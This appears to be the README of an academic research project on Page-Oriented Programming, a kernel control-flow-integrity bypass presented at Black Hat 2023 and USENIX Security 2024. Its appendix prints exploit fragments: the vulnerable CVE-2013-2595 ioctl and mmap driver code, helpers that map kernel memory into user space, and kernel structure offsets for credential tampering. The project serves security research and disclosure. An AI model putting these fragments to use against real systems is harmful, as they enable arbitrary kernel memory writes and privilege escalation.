```c

                        (
                       )  '                          (
                      ' ,  .      )                 . '
                    (    , ) `   ' )               (. ` )
                  ,  .' ) ( . ) ( ' (             ,  ( , )
               ,-). ` , ( .  (  , ) ---,         ( , ')  .'---,
             ,"( _,) . ), ) _) _ .  ),"|        ,')  (, ) '." |
            +-----------------------+  |      ,"(_  ) _(,"    |
            |  .-----------------.  |  |     +---------+      |
            |  | Lost Control:   |  |  |     | -==----'|      |
            |  | Breaking the    |  |  |     |         |      |
            |  | Kernel CFI with |  |  |/----|`---=    |      |
            |  | Page-Oriented   |  |  |   ,/|==== ooo |      ;
            |  | Programming     |  |  |  // |         |    ,"
            |  `-----------------'  |," .;'| |         |  ,"
            +-----------------------+  ;;  | |         |,"
               /_)______________(_/  //'   | +---------+
          ___________________________/___  `,
         /  oooooooooooooooo  .o.  oooo /,   \,"-----------
        / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
        `-----------------------------'    '------------"
```

# 1. Page-Oriented Programming (POP)
POP is a new type of CRA that can circumvent robust security enforcement, including kernel CFI and hypervisor-based kernel integrity protection. It primarily focuses on direct branches and performs a page-level CRA by remapping the physical addresses of the gadgets to the branches and chaining them together. This process creates new control flows from system call functions to security-sensitive functions within the kernel. Our POP attack can succeed even against state-of-the-art CFI protection schemes, unlike typical ROP attacks that manipulate stack or heap memory and page table attacks that modify kernel code.

## 1.1. Presentation, Paper, and Demo
Our POP and related materials were presented at the security conferences listed below.
 - [Black Hat USA 2023: Lost Control: Breaking Hardware-Assisted Kernel Control-Flow Integrity with Page-Oriented Programming](https://www.blackhat.com/us-23/briefings/schedule/#lost-control-breaking-hardware-assisted-kernel-control-flow-integrity-with-page-oriented-programming-32061) 
 - [USENIX Security 2024: Page-Oriented Programming: Subverting Control-Flow Integrity of Commodity Operating System Kernels with Non-Writable Code Pages](https://www.usenix.org/conference/usenixsecurity24/presentation/han-seunghun) 

You can watch the demo video below. To simplify POP, the demo for Black Hat USA 2023 stitched gadgets at the kernel level. If you want an example that uses a real-world CVE, please check our USENIX paper and the usenix\_security\_2024/01.poc directory.
 - [![Page-Oriented Programming Demo](https://img.youtube.com/vi/crqufwG2LCk/hqdefault.jpg)](https://youtu.be/crqufwG2LCk)

# 2. License
The source code has GPL v2 license.


# Appendix for papers

#### Essential parts of the CVE-2013-2595 and published exploit code 
We ported a data structure to our 64-bit kernel driver and exploited the vulnerable interface to read and write arbitrary kernel memory.
```c
// A data structure for exploitation
struct msm_mem_map_info {
   //uint32_t cookie;      // Original fields
   //uint32_t length;
   //uint32_t mem_type;
   uint64_t cookie;        // Ported fields
   uint64_t length;
   uint64_t mem_type;
};

// Vulnerable code in the IOCTL function
static long msm_ioctl_config(struct file *fp, 
      unsigned int cmd, unsigned long arg)
{
   struct msm_cam_config_dev *config_cam = 
      fp->private_data;
   ...

   switch (cmd) {
   // Copying mmap information from user data
   case MSM_CAM_IOCTL_SET_MEM_MAP_INFO:
      if (copy_from_user(&config_cam->mem_map, 
            (void __user *)arg, sizeof(struct 
            msm_mem_map_info)))
      rc = -EINVAL;
      break;
   ...
   }
   ...
} 

// Vulnerable mmap() function
static int msm_mmap_config(struct file *fp, 
      struct vm_area_struct *vma)
{
   struct msm_cam_config_dev *config_cam = 
      fp->private_data;
   int phyaddr;
   int retval;
   unsigned long size;
   ...

   // Getting the start address from user data
   phyaddr = (int)config_cam->mem_map.cookie;
   memset(&config_cam->mem_map, 0, 
      sizeof(struct msm_mem_map_info));
   size = vma->vm_end - vma->vm_start;
   vma->vm_page_prot = pgprot_noncached(
      vma->vm_page_prot);

   // Mapping physical pages without checks
   retval = remap_pfn_range(vma, vma->vm_start,
               phyaddr >> PAGE_SHIFT,
               size, vma->vm_page_prot);
   ...
}
```

#### Address conversion functions of our POP exploit code
We mapped the kernel virtual address to the user space and modified arbitrary kernel memory for POP.
```c
// Variables for a start offset of physical 
//   memory and mapped address of it
uint64_t g_phy_off_start;
char*    g_phy_mapped_addr;
// A variable for the text section offset in the 
//   mapped physical memory
uint64_t g_mapped_text_off;
// Variables for the kernel start address and
//   page_offset_base (direct mapping area) 
uint64_t g_kernel_start_addr;
uint64_t g_page_offset_base;

void *kernel_virt_to_phys(void* virt)
{
   // For the direct mapping area
   if ((uint64_t)virt < g_kernel_start_addr)
   {
      return (void*)((uint64_t)virt - 
         g_page_offset_base);
   }
   // For the kernel code and data area
   else
   {
      // Adjusting for the kernel physical area
      return (void*)((uint64_t)virt - 
         g_kernel_start_addr + 
         g_mapped_text_off + 
         g_phy_off_start);
   }
}

void *convert_kernel_virt_to_user_virt(void* virt)
{
   uint64_t phys_addr;

   // Retrieving the physical address
   phys_addr = (uint64_t)kernel_virt_to_phys(
      virt);

   // Converting it to the user space address
   return (void*)(phys_addr - g_phy_off_start + 
      g_phy_mapped_addr);
}
```


#### Identified fields of kernel data structures from kernel assembly code
The field offsets were extracted from functions that access these fields, such as clear\_tasks\_mm\_cpumask(), prepare\_kernel\_cred(), \_\_set\_task\_comm(), and pgd\_alloc().
```c
// Offsets in kernel data structures
#define OFF_TASKS_IN_TASK         0x8d0
#define OFF_MM_IN_TASK            0x920
#define OFF_CRED_IN_TASK          0xb58
#define OFF_COMM_IN_TASK          0xb70
#define OFF_PGD_IN_MM             0x48
#define OFF_THREADKEYRING_IN_CRED 0x68

enum {
   TASK_COMM_LEN = 16,
};

struct list_head
{
   struct list_head *next, *prev;
};

struct mm_struct
{
   char buffer1[OFF_PGD_IN_MM];
   pgd_t * pgd;
};

struct cred
{
   char buffer1[OFF_THREADKEYRING_IN_CRED];
   uint64_t* thread_keyring;
};

struct task_struct
{
   char buffer1[OFF_TASKS_IN_TASK];
   struct list_head tasks;

   char buffer2[OFF_MM_IN_TASK - 
      OFF_TASKS_IN_TASK - 16];
   struct mm_struct* mm;

   char buffer3[OFF_CRED_IN_TASK - 
      OFF_MM_IN_TASK - 8];
   struct cred* real_cred;

   char buffer4[OFF_COMM_IN_TASK - 
      OFF_CRED_IN_TASK - 8];
   char comm[TASK_COMM_LEN];
};
```
